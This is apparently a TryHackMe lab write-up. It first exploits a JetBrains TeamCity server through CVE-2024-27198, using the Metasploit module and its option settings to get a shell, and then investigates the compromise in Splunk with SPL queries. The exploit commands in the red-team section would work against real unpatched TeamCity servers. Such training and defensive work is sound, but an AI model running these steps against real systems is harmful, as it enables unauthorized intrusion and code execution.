# TryHackMe --- Brains

> **Room:** [Brains](https://tryhackme.com/room/brains)\
> **Platform:** TryHackMe\
> **Focus:** Web exploitation, Metasploit, SIEM investigation, and
> incident forensics\
> **Environment:** Authorized TryHackMe lab only

## Overview

Brains combines an offensive-security task with a defensive
investigation task. The first task focuses on discovering and exploiting
a vulnerable JetBrains TeamCity instance. The second switches
perspective: Splunk is used to investigate logs from a compromised
server and identify traces left by the activity.

This room was useful for connecting two sides of the same incident:

1.  **Red team:** enumerate the target, identify the exposed application
    and its vulnerability, and validate the impact in the lab.
2.  **Blue team:** query collected logs, correlate events, and identify
    suspicious account creation, package installation, and TeamCity
    plugin activity.

## Skills and tools

-   Nmap --- port and service enumeration
-   Metasploit Framework --- exploitation of the vulnerable TeamCity
    service
-   CVE research --- mapping an application version to a known
    vulnerability
-   Splunk Search Processing Language (SPL) --- searching and filtering
    logs
-   Linux package and application logs --- tracing post-exploitation
    changes
-   Incident investigation --- correlating events and interpreting
    evidence

------------------------------------------------------------------------

## Task 1 --- Red: Exploit the Server

### 1. Reconnaissance

I began by scanning the assigned target to identify exposed ports and
services. The room's target exposes SSH and web services, including a
web application on a non-default port.

Example scan (replace the placeholder with the IP assigned to your
current lab instance):

``` bash
nmap -sC -sV -oN nmap-scan.txt <TARGET_IP>
```

The important step was not simply listing open ports; it was using
service and version information to decide which service deserved further
investigation.

**Key observation:** the service on TCP port `50000` presented a
JetBrains TeamCity web interface. TeamCity commonly uses TCP port `8111`
by default, so the non-default port was important when configuring the
exploit module.

> Lab IP addresses are temporary. Do not copy an IP address from another
> person's walkthrough; use the address assigned to your own deployed
> machine.

### 2. Vulnerability identification

After identifying TeamCity, I researched the version and investigated
**CVE-2024-27198**, a critical authentication-bypass vulnerability
affecting JetBrains TeamCity On-Premises. Under vulnerable conditions,
an unauthenticated attacker can reach protected functionality and
achieve remote code execution.

-   **Application:** JetBrains TeamCity
-   **Vulnerability:** CVE-2024-27198
-   **Impact:** Authentication bypass that can lead to remote code
    execution
-   **Reference:** [NVD ---
    CVE-2024-27198](https://nvd.nist.gov/vuln/detail/CVE-2024-27198)

The room demonstrates why exposed CI/CD platforms deserve careful
attention: these systems often have access to build agents, source code,
deployment credentials, and other sensitive resources.

### 3. Exploitation with Metasploit

I used Metasploit to locate and run the module associated with the
TeamCity vulnerability.

``` text
msfconsole
search teamcity
use exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198
show options
```

I then configured the module for the **assigned lab target**, paying
particular attention to the target address, the non-default service
port, and the callback address reachable from the lab.

``` text
set RHOSTS <TARGET_IP>
set RPORT 50000
set LHOST <YOUR_LAB_REACHABLE_IP>
show options
check
run
```

The exact available options and the result of `check` depend on the
installed Metasploit version and the target state. I verified the
session output rather than assuming exploitation had succeeded merely
because the module ran.

**Outcome:** successful exploitation provided a shell/session in the
lab, which allowed me to locate the `flag.txt` file in the relevant
user's home directory.

-   **User flag:**
    `[REDACTED — enter only if you choose to keep it in a private local copy]`

### 4. Security lessons

-   Keep TeamCity updated to a fixed release and apply vendor security
    advisories promptly.
-   Do not expose CI/CD administration interfaces directly to untrusted
    networks.
-   Restrict access using network controls, VPNs, and strong
    authentication.
-   Review CI/CD service accounts, build agents, tokens, plugins, and
    secrets after a suspected compromise.
-   Monitor application logs for unexpected plugin uploads, account
    changes, and suspicious requests.

------------------------------------------------------------------------

## Task 2 --- Blue: Investigate with Splunk

The second task changes perspective from exploitation to incident
investigation. Instead of attacking the target, I used Splunk to search
the provided logs for evidence of activity after the compromise.

### Investigation approach

1.  Open the Splunk instance provided by the room.
2.  Set the time range to **All time** (or the range specified in the
    task).
3.  Search broadly for relevant events, then narrow the search to the
    log source and time window associated with each event.
4.  Correlate suspicious account creation, package installation, and
    TeamCity plugin activity.
5.  Record the evidence and explain why it is suspicious instead of
    relying on a single isolated event.

### 1. Find the backdoor account

Start by searching for events mentioning user creation:

``` spl
index=* "new user"
```

Review the matching events and record the account name from the relevant
user-creation event.

-   **Backdoor account identified:**
    `[FILL IN FROM YOUR SPLUNK RESULTS]`

This search is a starting point, not a universal detection rule. Field
names and log wording can differ between systems, so inspect the raw
event and refine the query as needed.

### 2. Investigate package installation

Package-manager logs can show software installed during the compromise.
The room's Linux package log can be searched with:

``` spl
index=* source="/var/log/dpkg.log" "installed"
```

Correlate the installation timestamp with the suspicious
account-creation event. The time relationship helps distinguish a
potentially malicious installation from routine package activity.

-   **Suspicious package identified:**
    `[FILL IN FROM YOUR SPLUNK RESULTS]`
-   **Relevant timestamp:**
    `[OPTIONAL — RECORD THE TIME FROM THE EVENT]`

A package name alone is not enough to prove maliciousness. Consider its
purpose, source, timing, and relationship to other events.

### 3. Investigate TeamCity plugin activity

TeamCity logs can contain evidence of plugin uploads. Search the
relevant application logs:

``` spl
index=* source="/opt/teamcity/*" "plugin" "uploaded"
```

Review the matching events and identify the plugin associated with the
suspicious activity.

-   **Plugin identified:** `[FILL IN FROM YOUR SPLUNK RESULTS]`

Unexpected plugin installation or upload can be a persistence or
code-execution concern, particularly when it follows exploitation of the
application. Confirm the event details and correlate its timestamp with
other evidence.

### 4. Correlate the timeline

A useful investigation timeline should connect the events rather than
treat each search result separately:

  -----------------------------------------------------------------------
  Stage                   Evidence to record      Why it matters
  ----------------------- ----------------------- -----------------------
  Initial access          TeamCity exploitation   Establishes the likely
                          evidence, if present in entry point
                          the logs                

  Account changes         New-user event and      May indicate creation
                          account name            of a backdoor account

  Software changes        Package-manager event   May reveal additional
                          and package name        tooling or persistence

  Application changes     TeamCity plugin upload  May indicate
                          event                   post-exploitation
                                                  activity

  Correlation             Timestamps and relevant Helps establish a
                          host/log source         plausible sequence
  -----------------------------------------------------------------------

**Investigation findings**

-   **Backdoor account:** `[FILL IN]`
-   **Suspicious package:** `[FILL IN]`
-   **Uploaded plugin:** `[FILL IN]`

I have left these values as placeholders rather than guessing them.
Populate them with the values you actually observed in your lab before
publishing this README.

------------------------------------------------------------------------

## What I learned

-   **Reconnaissance drives the next step.** Port and service discovery
    helped identify which application needed investigation.
-   **Version research matters.** Identifying the application and its
    version made it possible to connect the service to a known CVE.
-   **Metasploit is a framework, not a substitute for understanding.**
    Correct target settings and confirmation of a session were essential
    to validating the result.
-   **Logs preserve post-exploitation evidence.** Account changes,
    package installation, and plugin uploads can reveal activity that is
    not obvious from the initial foothold.
-   **SPL is most useful when used iteratively.** Broad searches helped
    locate events; source filters, keywords, timestamps, and correlation
    helped narrow the investigation.
-   **Offensive and defensive workflows complement each other.** The
    exploitation task demonstrated impact, while the Splunk task showed
    how defenders can investigate activity left behind.

## Remediation recommendations

1.  Upgrade TeamCity to a vendor-fixed version and follow JetBrains
    security advisories for CVE-2024-27198.
2.  Restrict access to CI/CD interfaces and management ports to trusted
    networks.
3.  Audit local accounts and remove unauthorized accounts.
4.  Review installed packages, services, and application plugins for
    unauthorized changes.
5.  Centralize and retain application, authentication, and
    package-manager logs.
6.  Alert on unexpected account creation, plugin uploads, and unusual
    software installations.
7.  Rotate potentially exposed credentials, API tokens, and build
    secrets after a confirmed compromise.

## References

-   [TryHackMe --- Brains](https://tryhackme.com/room/brains)
-   [NVD ---
    CVE-2024-27198](https://nvd.nist.gov/vuln/detail/CVE-2024-27198)
-   [TryHackMe --- Metasploit:
    Introduction](https://tryhackme.com/room/metasploitintro)
-   [Splunk Search
    Manual](https://docs.splunk.com/Documentation/Splunk/latest/Search/Aboutthesearchlanguage)

## Disclaimer

This write-up documents learning in the authorized TryHackMe training
environment. The commands and techniques described here must only be
used against systems for which you have explicit permission. No
real-world targets are intended.
